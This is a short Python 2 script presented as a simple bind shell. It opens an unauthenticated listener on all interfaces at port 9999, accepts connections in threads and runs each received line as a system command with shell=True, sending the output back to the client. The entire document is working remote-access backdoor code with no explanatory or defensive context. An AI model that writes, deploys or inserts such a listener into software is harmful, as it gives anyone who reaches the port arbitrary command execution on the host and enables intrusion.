#A simple bind shell in python

import sys
import socket
import getopt
import threading
import subprocess
bind_ip = "0.0.0.0"
bind_port = 9999
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip,bind_port))
server.listen(5)
print "[*] Listening on %s:%d" % (bind_ip,bind_port)

def run_command(command):
        # trim the newline
        command = command.rstrip()
        # run the command and get the output back
        try:
         output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
        except:
                output = "Failed to execute command.\r\n"
                # send the output back to the client
        return output

def handle_client(client_socket):
		client_socket.send("<SHELL:#> ")
		cmd_buffer = ""
		while "\n" not in cmd_buffer:
			cmd_buffer += client_socket.recv(1024)
		response = run_command(cmd_buffer)
		client_socket.send(response)


while True:
	client,addr = server.accept()
	print "[*] Accepted connection from: %s:%d" % (addr[0],addr[1])
	client_handler = threading.Thread(target=handle_client,args=(client,))
	client_handler.start()
